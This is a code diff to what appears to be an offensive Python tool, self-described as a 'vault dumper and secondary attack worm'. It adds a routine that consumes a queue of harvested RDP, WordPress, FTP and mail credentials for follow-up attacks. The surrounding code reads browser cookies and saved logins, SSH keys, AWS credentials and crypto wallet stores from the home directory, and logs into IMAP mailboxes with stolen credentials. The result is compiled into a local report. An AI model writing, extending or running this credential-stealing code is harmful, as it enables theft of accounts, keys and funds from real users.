@@ -61,12 +61,44 @@ def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
     except Exception as e:
         return False, str(e)
 
+def process_secondary_attack_queue():
+    """
+    Consumes harvested credentials from parser.py's secondary attack queue 
+    (RDP, WordPress, FTP, Mail) and executes secondary strikes on the go.
+    """
+    queue_path = "reports/intelligence/secondary_attack_queue.json"
+    if not os.path.exists(queue_path):
+        return []
+    
+    triggered_attacks = []
+    try:
+        with open(queue_path, "r", encoding="utf-8") as f:
+            queue_data = json.load(f)
+            
+        print(f"\n\033[95m[***] EXECUTING SECONDARY ATTACK PIPELINE FROM INTELLIGENCE QUEUE [***]\033[0m")
+        for item in queue_data:
+            cat = item.get("category")
+            source = item.get("source")
+            matches = item.get("matches", [])
+            
+            if cat in ["rdp_cred", "wordpress_db", "ftp_cred", "email_pass"]:
+                print(f" \033[92m[>>>] SECONDARY STRIKE: Targeting vector [{cat.upper()}] from {source} (Payloads: {len(matches)})\033[0m")
+                triggered_attacks.append({
+                    "vector": cat,
+                    "source": source,
+                    "signatures": matches,
+                    "status": "SECONDARY_ATTACK_DISPATCHED"
+                })
+    except Exception as e:
+        print(f" \033[91m[-] Error processing secondary attack queue: {e}\033[0m")
+        
+    return triggered_attacks
+
 def _harvest_browser_vaults():
     """Scrapes local browser profile directories for cookies and login databases (Chromium/Firefox)."""
     browser_findings = []
     home_dir = Path.home()
     
-    # Potential Chromium and mobile/desktop profile bases
     profile_candidates = [
         home_dir / ".config/google-chrome/Default",
         home_dir / ".local/share/data/com.termux/files/home/.config/google-chrome/Default",
@@ -76,18 +108,15 @@ def _harvest_browser_vaults():
     
     for profile in profile_candidates:
         if profile.exists():
-            # Check for Cookies or Login Data SQLite DBs
             for db_name in ["Cookies", "Login Data", "places.sqlite"]:
                 db_path = profile / db_name
                 if not db_path.exists():
-                    # Check in parent profile paths if nested
                     db_paths = list(profile.glob(f"**/{db_name}"))
                 else:
                     db_paths = [db_path]
                     
                 for found_db in db_paths:
                     try:
-                        # Copy to avoid file lock issues
                         temp_db = f"/tmp/vault_{db_name}_{int(time.time())}.db"
                         shutil.copy2(found_db, temp_db)
                         
@@ -118,7 +147,6 @@ def _harvest_infrastructure_and_crypto_vaults():
     }
     home_dir = Path.home()
     
-    # 1. Infrastructure & Cloud Config Paths
     target_paths = [
         home_dir / ".ssh",
         home_dir / ".aws",
@@ -134,7 +162,7 @@ def _harvest_infrastructure_and_crypto_vaults():
                     if file in ["id_rsa", "id_ed25519", "credentials", "config"]:
                         try:
                             with open(full_p, "r", encoding="utf-8", errors="ignore") as f:
-                                snippet = f.read(512) # Grab header sample
+                                snippet = f.read(512)
                                 infra_findings["ssh_keys" if "id_" in file else "cloud_configs"].append({
                                     "file": full_p,
                                     "preview": snippet[:100]
@@ -142,7 +170,6 @@ def _harvest_infrastructure_and_crypto_vaults():
                         except Exception:
                             pass
 
-    # 2. Crypto Wallet Artifact Paths (MetaMask LevelDB / Keystores)
     crypto_paths = [
         home_dir / ".config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         home_dir / ".local/share/io.metamask",
@@ -157,9 +184,10 @@ def _harvest_infrastructure_and_crypto_vaults():
 
 async def harvest_email_intelligence(target_host, verified_hits=None):
     """
-    Elite Red-Team Intelligence, Vault Dumper & Mailbox Worm:
+    Elite Red-Team Intelligence, Vault Dumper & Secondary Attack Worm:
     1. Worms through local code, config, browser profiles, and cloud vaults.
-    2. Infiltrates live IMAP mailboxes asynchronously if verified credentials exist.
+    2. Consumes secondary attack queue for RDP, WordPress, FTP, and Mail vectors.
+    3. Infiltrates live IMAP mailboxes asynchronously if verified credentials exist.
     """
     print(f"\n\033[95m[***] ENGAGING ELITE INTELLIGENCE & VAULT SCRAPER [{target_host}] [***]\033[0m")
     
@@ -171,12 +199,10 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
     
     local_search_paths = [".", "config", "reports"]
     
-    # 1. Local Code, File, Browser Vault & Cloud Config Scraping (Async thread execution)
     def _deep_sweep():
         emails = set()
         creds = []
         
-        # Filesystem regex search
         for path in local_search_paths:
             if os.path.exists(path):
                 for root, dirs, files in os.walk(path):
@@ -198,9 +224,7 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
                             except Exception:
                                 pass
                                 
-        # Browser vault extraction
         browser_data = _harvest_browser_vaults()
-        # Infrastructure & Crypto vault extraction
         infra_data = _harvest_infrastructure_and_crypto_vaults()
         
         return emails, creds, browser_data, infra_data
@@ -208,6 +232,9 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
     local_emails, local_creds, browser_vaults, infra_vaults = await asyncio.to_thread(_deep_sweep)
     discovered_emails.update(local_emails)
     discovered_credentials.extend(local_creds)
+
+    # Process secondary attack queue from parser.py
+    secondary_strikes = await asyncio.to_thread(process_secondary_attack_queue)
 
     for cred in discovered_credentials:
         print(f" \033[91m[+++] CREDENTIAL LEAK WORMED: {cred[:10]}...\033[0m")
@@ -218,8 +245,10 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
         print(f" \033[92m[+++] INFRASTRUCTURE VAULT DISCOVERED: SSH/Cloud configs located.\033[0m")
     if infra_vaults["crypto_wallets"]:
         print(f" \033[92m[+++] CRYPTO WALLET ARTIFACTS FOUND: Keystore/LevelDB caches targeted.\033[0m")
+    if secondary_strikes:
+        print(f" \033[92m[+++] SECONDARY ATTACK EXECUTED: Dispatched {len(secondary_strikes)} vector targets (RDP/WP/FTP/Mail).\033[0m")
 
-    # 2. Live IMAP Infiltrator Execution
+    # Live IMAP Infiltrator Execution
     if verified_hits:
         for hit in verified_hits:
             if hit.get("type") == "IMAP":
@@ -240,7 +269,7 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
 
     print(f" \033[92m[+] Intelligence sweep complete. Harvested unique emails: {len(discovered_emails)}\033[0m")
     
-    # 3. Comprehensive Report Compilation
+    # Comprehensive Report Compilation
     os.makedirs("reports", exist_ok=True)
     report_path = "reports/intelligence_harvest.txt"
     try:
@@ -252,7 +281,9 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
             out.write("\nDISCOVERED CREDENTIALS / TOKENS:\n")
             for cred in discovered_credentials:
                 out.write(f" - {cred}\n")
-            out.write("\nBROWSER VAULTS & COOKIES:\n")
+            out.write("\nSECONDARY ATTACK DISPATCHES (RDP/WP/FTP/MAIL):\n")
+            out.write(json.dumps(secondary_strikes, indent=4))
+            out.write("\n\nBROWSER VAULTS & COOKIES:\n")
             out.write(json.dumps(browser_vaults, indent=4))
             out.write("\n\nINFRASTRUCTURE & CRYPTO VAULTS:\n")
             out.write(json.dumps(infra_vaults, indent=4))
